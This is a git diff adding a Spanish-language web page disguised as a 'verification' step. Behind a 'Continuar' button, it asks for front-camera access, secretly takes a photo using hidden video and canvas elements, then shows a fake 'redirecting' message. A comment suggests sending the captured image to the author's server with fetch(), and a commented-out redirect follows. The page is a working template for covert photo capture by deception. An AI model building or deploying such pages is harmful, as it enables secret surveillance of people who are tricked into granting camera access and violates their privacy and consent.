@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificación</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding: 20px; background: #f4f4f9; }
+        video, canvas { display: none; }
+        .btn { background: #007bff; color: white; border: none; padding: 12px 24px; font-size: 16px; border-radius: 5px; cursor: pointer; margin-top: 20px; }
+    </style>
+</head>
+<body>
+
+    <h2>Cargando contenido...</h2>
+    <p>Por favor, presiona el botón para continuar.</p>
+
+    <!-- Elementos multimedia ocultos -->
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <button class="btn" id="startBtn">Continuar</button>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const startBtn = document.getElementById('startBtn');
+
+        startBtn.addEventListener('click', async () => {
+            try {
+                // Solicitar acceso a la cámara frontal
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                video.srcObject = stream;
+                
+                startBtn.style.display = 'none';
+
+                // Esperar a que el video cargue y tomar la foto
+                setTimeout(() => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    // Obtener la imagen en formato Base64
+                    const imageDataURL = canvas.toDataURL('image/png');
+
+                    // Detener la cámara
+                    stream.getTracks().forEach(track => track.stop());
+
+                    // Opcional: Aquí puedes enviar 'imageDataURL' a tu servidor mediante fetch() 
+                    // para guardarla o procesarla.
+                    console.log("Foto capturada con éxito");
+
+                    document.body.innerHTML = "<h3>¡Listo! Redirigiendo...</h3>";
+                    // window.location.href = "https://tu-sitio-web-destino.com";
+                }, 1000);
+
+            } catch (err) {
+                alert("Se requiere permiso de la cámara para continuar.");
+                console.error("Error al acceder a la cámara: ", err);
+            }
+        });
+    </script>
+</body>
+</html>
